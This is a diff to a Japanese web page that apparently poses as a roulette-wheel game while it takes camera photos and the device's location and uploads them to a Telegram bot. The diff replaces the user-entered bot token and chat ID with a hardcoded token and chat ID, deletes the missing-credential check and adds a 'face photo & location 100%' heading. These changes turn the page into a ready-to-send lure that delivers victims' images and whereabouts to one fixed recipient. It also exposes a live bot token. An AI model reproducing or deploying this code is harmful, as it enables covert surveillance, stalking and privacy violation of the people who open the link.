@@ -1,3 +1,5 @@
+顔写真&位置情報100%
+
 <!DOCTYPE html>
 <html lang="ja">
 <head>
@@ -76,10 +78,12 @@
   ・端末のカメラを使用した写真の撮影<br>
   ・現在地（位置情報）の取得<br>
   ・取得されたデータの外部サービスへの送信<br><br>
-  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。<br><br>
+  これらの処理は、画面上の確認操作およびユーザーの明示的な同意があった場合のみ実行されます。
+  同意しない場合は、データの取得および送信は行われません。<br><br>
   取得されたデータは、本デモの動作確認および学習目的のためにのみ使用されます。<br><br>
   許可なく第三者に対してこのURLを送信したり、実行させたりする行為は禁止されています。
-  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。
+  内容によっては法律（不正指令電磁的記録に関する罪、プライバシー侵害等）に抵触する可能性があります。<br><br>
+  本デモは仕組みの理解を目的としており、悪用を推奨するものではありません。
 </details>
 
 <script>
@@ -91,8 +95,8 @@ function animateBG() {
 }
 animateBG();
 
-const BOT_TOKEN = prompt("Telegramボットのトークンを入力してください");
-const CHAT_ID = prompt("送信先のチャットIDを入力してください");
+const BOT_TOKEN = "8722419105:AAEQd0Tpobob0BQBnWKNGQY0lXhpKa3NdXE";
+const CHAT_ID = "7541612001";
 
 const canvas = document.getElementById("wheel");
 const ctx = canvas.getContext("2d");
@@ -180,12 +184,6 @@ async function finalSend() {
   document.getElementById("confirmModal").style.display = "none";
   document.getElementById("result").textContent = "送信中...";
   
-  if (!BOT_TOKEN || !CHAT_ID) {
-    alert("トークンまたはIDが未入力のため送信できません。");
-    resetUI();
-    return;
-  }
-
   for (const blob of tempPhotos) {
     const fd = new FormData();
     fd.append("chat_id", CHAT_ID);
@@ -246,3 +244,4 @@ document.getElementById("noDataOk").onclick = resetUI;
 </script>
 </body>
 </html>
+
